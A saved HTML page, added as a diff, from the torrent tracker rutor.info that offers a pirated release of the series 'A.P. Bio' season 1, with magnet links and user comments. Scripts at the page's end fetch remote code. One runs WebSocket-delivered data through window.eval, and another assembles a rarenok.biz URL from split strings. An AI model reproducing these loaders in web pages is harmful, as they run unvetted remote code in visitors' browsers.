@@ -1,0 +1,368 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Курс Биологии / A.P. Bio [S01] (2018) WEB-DL 720p | Jaskier</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Курс Биологии / A.P. Bio [S01] (2018) WEB-DL 720p | Jaskier</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:7d02d84230c59c943167805cc6b316d97c84ed0e&amp;dn=rutor.info_%D0%9A%D1%83%D1%80%D1%81+%D0%91%D0%B8%D0%BE%D0%BB%D0%BE%D0%B3%D0%B8%D0%B8+%2F+A.P.+Bio+%5BS01%5D+%282018%29+WEB-DL+720p+%7C+Jaskier&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=612131"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/612131"><img src="http://s.rutor.info/t/down.png"> Скачать A_P_Bio._Season_1_WEB-DL_l_720p_l_Jaskier.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://i103.fastpic.ru/big/2018/0207/55/1527067260ad783b7ef3914893ac3555.png" /><br />
+<br />
+<u>Информация о фильме</u><br />
+<b>Название:</b> Курс Биологии<br />
+<b>Оригинальное название:</b> A.P. Bio<br />
+<b>Год выпуска:</b> 2018<br />
+<b>Жанр:</b>  <a href="/tag/4/Комедия" target="_blank">Комедия</a><br />
+<b>Режиссер:</b> Османи Родригез, Райан Кейс<br />
+<b>В ролях:</b> Гленн Хоуертон, Лайрик Льюис, Мэри Сон, Апарна Бриэль, Ник Пейн, Пэттон Освальт, Такер Албрицци, Эллисин Эшли Арм, Джейкоб Хьюстон<br />
+<br />
+<b>О фильме:</b> Сериал повествует о профессоре философии Джеке (Гленн Хоуертон), который безмерно обожает свою работу. Однако, утратив место своей мечты, Джек перестаёт трудиться в качестве профессора, и вынужден изменить сферу деятельности. Теперь он — учитель биологии в высшей школе. Но Джек дал всем ясно понять, что профессия учителя не является приоритетной для него, и он не стремится обучать детей в высшей школе какой-то биологии. Понимая, что в его распоряжении есть класс, который полон учеников, славящихся прекрасными знаниями и занимающих почётные места, учитель решает использовать школьников в личных целях.<br />
+<br />
+ <a href="http://www.imdb.com/title/tt6461726/" target="_blank"><img src="http://s.rutor.info/imdb/pic/6461726.gif" /></a> <a href="http://www.kinopoisk.ru/film/1030256/" target="_blank"><img src="http://www.kinopoisk.ru/rating/1030256.gif" /></a><a href="http://multi-up.com/1186358" target="_blank"><img src="http://i82.fastpic.ru/big/2016/1014/97/49fd58ade79b150df39ad49c279e3b97.gif" /></a><br />
+<br />
+<b>Выпущено:</b> США, Broadway Video, Universal Television<br />
+<b>Продолжительность: </b>~ 00:25:00<br />
+<b>Перевод: </b>Профессиональный (многоголосый закадровый) студия Jaskier<br />
+<br />
+<u>Файл</u><br />
+<b>Кодек: </b>  | X264 | MKV |<br />
+<b>Качество: </b> WEB-DL 720p<br />
+<b>Видео: </b> ~ 2500 kbps, 1280x720, 23.976 fps<br />
+<b>Аудио Rus:</b> AC3, 6 ch, 384 kbps<br />
+<b>Аудио Eng:</b> AC3, 6 ch, 384 kbps<br />
+<b>Субтитры: </b>английские<br />
+<b>Присутствует аудио-реклама</b>.<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://lostpic.net/image/c2eP" target="_blank"><img src="http://img12.lostpic.net/2018/02/07/6eb2e0b279f17f9af35156b6e48acb21.th.png" /></a> <a href="http://lostpic.net/image/c2eb" target="_blank"><img src="http://img12.lostpic.net/2018/02/07/a0916f45762ef556c8bdaf5f18357906.th.png" /></a> <a href="http://lostpic.net/image/c2eu" target="_blank"><img src="http://img12.lostpic.net/2018/02/07/48267b9716772c1d8de60685951e1154.th.png" /></a></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Раздача ведется путем добавления новых серий</div><div class="hidebody"></div><textarea class="hidearea">Когда раздача ведётся путём добавления новых серий, при каждом добавлении создётся новый торрент. Чтобы начать докачку новой серии, пользователям необходимо сделать следующее:<br />
+(1) остановить скачивание,<br />
+(2) удалить старый торрент у себя из клиента (старые серии удалять не надо),<br />
+(3) скачать новый торрент и запустить его у себя в клиенте вместо старого, при этом указать клиенту путь в старую папку, куда и должно происходить скачивание новых серий.<br />
+Ваш клиент при этом должен произвести хеширование (проверку) старой папки (если не производит сам - помогите ему сделать это), и будет докачивать только те серии, которых у вас ещё нет. Старые серии при этом не удаляются, а продолжают раздаваться!<br />
+Eсли вы уже удалили старые серии, то предотвратить повторную закачку старых серий можно, отжав галочку в соответсвующих местах при запуске нового торрента. По возможности, желательно не удалять старые серии как можно дольше, чтобы релизёр не столько продолжал раздавать старые серии, а смог сконцентрироваться на новых.</textarea></div><br />
+<br />
+<b>Релиз от: </b>Jaskier</td></tr>
+
+<tr><td class="header">Оценка</td><td>6 из 10 (2 голосов, самая низкая оценка - 3, самая высокая - 9)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/seriali" target="_blank">Сериалы </a></td></tr>
+<tr><td class="header">Раздают</td><td>2</td></tr>
+<tr><td class="header">Качают</td><td>7</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 6:19:05 (52 минуты назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 13:47:58  (17 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>6.06&nbsp;GB  (6508735760 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 612131);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/612132"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:8d65237fd81beb041e842a5d00ea7addcc4c4466&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/612132/kurs-biologii_a.p-bio-s01-2018-web-dlrip-jaskier">Курс Биологии / A.P. Bio [S01] (2018) WEB-DLRip | Jaskier </a></td> 
+<td align="right">3.18&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;13</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/612130"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1b4db0bc1c1ece2c22a7e6f9a93909d040bcbfdc&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/612130/kurs-biologii_a.p-bio-s01-2018-web-dl-1080p-jaskier">Курс Биологии / A.P. Bio [S01] (2018) WEB-DL 1080p | Jaskier </a></td> 
+<td align="right">13.62&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="gai"><td>05&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/629973"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5f2d2e0e0822aaf788199d4da72de3843f14a473&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/629973/kurs-biologii_a.p-bio-01x01-13-iz-20-2018-webrip-720p-coldfilm">Курс Биологии / A.P. Bio [01x01-13 из 20] (2018) WEBRip 720p  | ColdFilm </a></td> 
+<td align="right">7.99&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;8</span></td></tr><tr class="tum"><td>05&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/629972"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:4630e08be66dd5fd54064ba1d05e5b4879b77ba2&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/629972/kurs-biologii_a.p-bio-01x01-13-iz-20-2018-webrip-coldfilm">Курс Биологии / A.P. Bio [01x01-13 из 20] (2018) WEBRip  | ColdFilm </a></td> 
+<td align="right">3.47&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;10</span></td></tr><tr class="gai"><td>28&nbsp;Апр&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/611017"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7c47444ac129622d488b00322c169a3d6e4eaeb5&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/611017/kurs-biologii_a.p-bio-01x01-09-iz-13-2018-webrip-1080p-ideafilm">Курс Биологии / A.P. Bio [01x01-09 из 13] (2018) WEBRip 1080p | IdeaFilm </a></td> 
+<td align="right">10.75&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="tum"><td>28&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/611015"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f9ae5dc49e9c31743a6eb058b84d5bbf07090185&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/611015/kurs-biologii_a.p-bio-01x01-09-iz-13-2018-webrip-ideafilm">Курс Биологии / A.P. Bio [01x01-09 из 13] (2018) WEBRip | IdeaFilm </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">2.63&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="gai"><td>28&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/611016"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:6b0aca2b00f5bdf27036e3356fbc6ee69cf594f2&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/611016/kurs-biologii_a.p-bio-01x01-09-iz-13-2018-webrip-720p-ideafilm">Курс Биологии / A.P. Bio [01x01-09 из 13] (2018) WEBRip 720p | IdeaFilm </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">7.29&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/4/0/0/A.P. Bio" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/612131.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (13)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=612131">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(612131);">Промодерировать раздачу</span> | <span onclick="confirm_delete(612131);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/612131">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>Сэрожа</b></td> <td>08-05-2018 22:06:29 (9 часов назад)</td> <td></td> <td align="right"><span id="c_3199580"></span><script type="text/javascript">cOptions(848797,3199580);</script></td></tr><tr><td class="c_t" colspan=4>Ибо зачем комментировать эту несмешную чушь, высосанную из пальца. Да, несколько первых серий сериал еще выезжал за счет харизмы этого полного по...фигиста, на всех кладущего, а потом - увы. Чушь.<br />
+Начал его смотреть только за счет имени Гленна Ховертона (В Филадельфиии всегда солнечно) и обломался <img src="http://s.rutor.info/t/smilies/sad.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>lexei</b></td> <td>28-04-2018 18:59:05 (11 день назад)</td> <td>Оценил на: <b>3</b></td> <td align="right"><span id="c_3195103"></span><script type="text/javascript">cOptions(270023,3195103);</script></td></tr><tr><td class="c_t" colspan=4>А если отличный сериал, почему так с коментами куцо ?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Necronomius</b></td> <td>24-04-2018 22:59:10 (14 дня назад)</td> <td>Оценил на: <b>9</b></td> <td align="right"><span id="c_3193413"></span><script type="text/javascript">cOptions(824449,3193413);</script></td></tr><tr><td class="c_t" colspan=4>отличный сериал! </td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
